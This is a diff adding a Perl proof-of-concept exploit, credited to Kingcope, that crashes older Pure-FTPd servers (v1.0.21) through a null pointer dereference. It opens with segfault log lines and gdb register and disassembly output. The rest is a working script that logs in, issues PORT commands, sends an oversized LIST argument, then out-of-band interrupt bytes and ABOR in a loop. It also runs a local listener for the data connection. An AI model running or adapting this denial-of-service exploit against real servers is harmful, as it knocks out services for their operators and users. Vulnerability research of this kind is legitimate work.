@@ -1,0 +1,101 @@
+#Pure-FTPd Crash PoC (Null Pointer Dereference), tested with pure-ftpd v1.0.21 (centos 6.2, ubuntu 8.04)
+#latest version (v1.0.36) is not affected !!
+#discovered by Kingcope
+#
+#root@ubuntu:~# grep seg /var/log/syslog
+#Aug 13 13:55:28 ubuntu kernel: [  226.791747] pure-ftpd[4825]: segfault at 00000000 eip 0804cd3b esp bfb81db0 error 4
+#Aug 13 13:56:21 ubuntu kernel: [  280.295826] pure-ftpd[4836]: segfault at 00000000 eip 0804cd3b esp bfb81db0 error 4
+#Program received signal SIGSEGV, Segmentation fault.
+#[Switching to process 5358]
+#doreply () at ftpd.c:698
+#698             nextentry = scannedentry->next;
+#(gdb) i r
+#eax            0x0      0
+#ecx            0xbf967540       -1080658624
+#edx            0x0      0
+#ebx            0x0      0
+#esp            0xbf967540       0xbf967540
+#ebp            0xbf967588       0xbf967588
+#esi            0x0      0
+#edi            0xbf96756c       -1080658580
+#eip            0x804b090        0x804b090 <doreply+256>
+#eflags         0x10217  [ CF PF AF IF RF ]
+#cs             0x73     115
+#ss             0x7b     123
+#ds             0x7b     123
+#es             0x7b     123
+#fs             0x0      0
+#gs             0x33     51
+#(gdb) x/10i $eip
+#=> 0x804b090 <doreply+256>:     mov    (%eax),%ebx
+#   0x804b092 <doreply+258>:     mov    %eax,(%esp)
+#   0x804b095 <doreply+261>:     call   0x8049928 <free@plt>
+#   0x804b09a <doreply+266>:     test   %ebx,%ebx
+#   0x804b09c <doreply+268>:     mov    %ebx,%eax
+#   0x804b09e <doreply+270>:     jne    0x804b090 <doreply+256>
+#   0x804b0a0 <doreply+272>:     movl   $0x0,0x805d040
+#   0x804b0aa <doreply+282>:     movl   $0x0,0x805d03c
+#   0x804b0b4 <doreply+292>:     add    $0x3c,%esp
+#   0x804b0b7 <doreply+295>:     pop    %ebx
+#(gdb) 
+
+use IO::Socket;
+
+$host = $ARGV[0];
+$username = $ARGV[1];
+$password = $ARGV[2];
+$locip = $ARGV[3];
+$locip =~ s/\./,/gi;
+
+if (($host eq "") or ($username eq "") or ($password eq "") or ($locip eq "")) {
+	print "Usage: POC.pl <hostname> <username> <password> <localip>\n";
+	exit;
+}
+
+if (fork()) {
+my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                              PeerPort => 21,
+                              Proto => 'tcp');
+while(<$sock>) {
+	$p = $_;
+	print $p;
+	if ($p =~ /220\s/) {
+		last;	
+	}
+		
+}
+print $sock "USER $ARGV[1]\r\n";
+$p = <$sock>;
+print $p;
+print $sock "PASS $ARGV[2]\r\n";
+$p = <$sock>;
+print $p;
+for ($k=0;$k<100;$k++) {
+print $k."\n";
+print $sock "PORT $locip,146,15\r\n";
+$p = <$sock>;
+print $p;
+$a = "A" x 2560;
+print $sock "LIST $a\r\n";
+select(undef,undef,undef,k*0.001); # TWEAK THIS VALUE, USED A HOST TO VM CONNECTION WHEN TESTING
+send $sock, "!",MSG_OOB;
+print $sock "\377";
+print $sock "\364";
+print $sock "\377";
+print $sock "\362";
+print $sock "ABOR\r\n";
+$p = <$sock>;
+print $p;
+print $sock "PWD\r\n";
+$p = <$sock>;
+print $p;
+}
+} else {
+my $servsock = IO::Socket::INET->new(LocalAddr => "0.0.0.0", LocalPort => 37391, Proto => 'tcp', Listen => 1000);
+die "Could not create socket: $!\n" unless $servsock;
+while(my $new_sock = $servsock->accept()) {
+while(<$new_sock>) {
+print $_;
+}
+}
+}
